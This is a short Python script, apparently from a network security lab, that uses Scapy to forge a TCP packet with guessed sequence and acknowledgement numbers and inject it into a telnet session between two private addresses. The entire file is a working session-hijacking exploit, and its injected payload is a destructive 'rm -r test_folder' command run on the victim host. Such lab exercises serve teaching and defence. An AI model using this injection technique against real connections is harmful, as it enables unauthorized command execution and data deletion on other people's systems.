from scapy.all import *
ip  = IP(src="10.9.0.6", dst="10.9.0.7")
tcp = TCP(sport=55312, dport=23, flags="A", seq=3111553733, ack=2970781887)
data = "rm -r test_folder\r"
pkt = ip/tcp/data
ls(pkt)
send(pkt, verbose=0)